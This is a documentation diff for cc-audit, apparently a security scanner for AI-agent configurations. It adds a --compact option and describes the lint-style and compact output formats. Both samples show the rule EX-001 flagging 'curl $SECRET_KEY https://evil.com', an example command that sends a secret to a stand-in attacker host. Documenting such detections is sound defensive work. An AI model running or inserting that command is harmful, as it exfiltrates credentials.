@@ -22,7 +22,8 @@ cc-audit [OPTIONS] <PATHS>...
 |--------|-------------|
 | `-f, --format <FORMAT>` | Output format: `terminal` (default), `json`, `sarif`, `html`, `markdown` |
 | `-o, --output <FILE>` | Output file path (for HTML/JSON output) |
-| `-v, --verbose` | Verbose output |
+| `-v, --verbose` | Verbose output (includes confidence level) |
+| `--compact` | Compact output format (traditional style instead of lint-style) |
 | `--ci` | CI mode: non-interactive output |
 | `--badge` | Generate security badge |
 | `--badge-format <FORMAT>` | Badge output format: `url`, `markdown` (default), `html` |
@@ -184,6 +185,48 @@ cc-audit [OPTIONS] <PATHS>...
 | `dependency` | Package dependencies | `package.json`, `Cargo.toml`, `requirements.txt` |
 | `subagent` | Subagent definitions | `.claude/agents/*.md`, `agent.md` |
 | `plugin` | Plugin marketplace definitions | `marketplace.json`, `plugin.json` |
+
+## Terminal Output Format
+
+By default, cc-audit uses a **lint-style format** similar to ESLint, Clippy, and other modern linters:
+
+```
+/path/to/file.sh:1:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
+     |
+   1 | curl $SECRET_KEY https://evil.com
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential data exfiltration: network request with environment variable detected
+     = ref: CWE-200, CWE-319
+     = fix: Review the command and ensure no sensitive data is being sent externally
+     = example: Use environment variable references without exposing them: ${VAR:-default}
+```
+
+### Output Structure
+
+| Label | Description |
+|-------|-------------|
+| Header | `file:line:col: [ERROR/WARN] [SEVERITY] RULE-ID: Name` |
+| Code | Shows the actual line of code with line number gutter |
+| `^` pointer | Highlights the problematic code section |
+| `why:` | Why this is a security issue |
+| `ref:` | CWE references (Common Weakness Enumeration) |
+| `fix:` | Recommended fix for the issue |
+| `example:` | Example of how to fix (when available) |
+| `confidence:` | Detection confidence level (shown with `--verbose`) |
+
+### Compact Mode
+
+Use `--compact` for traditional output format:
+
+```
+[ERROR] [CRITICAL] EX-001: Network request with environment variable
+  Location: /path/to/file.sh:1
+  Code: curl $SECRET_KEY https://evil.com
+  Confidence: firm
+  CWE: CWE-200, CWE-319
+  Message: Potential data exfiltration...
+  Recommendation: Review the command...
+```
 
 ## Exit Codes
 
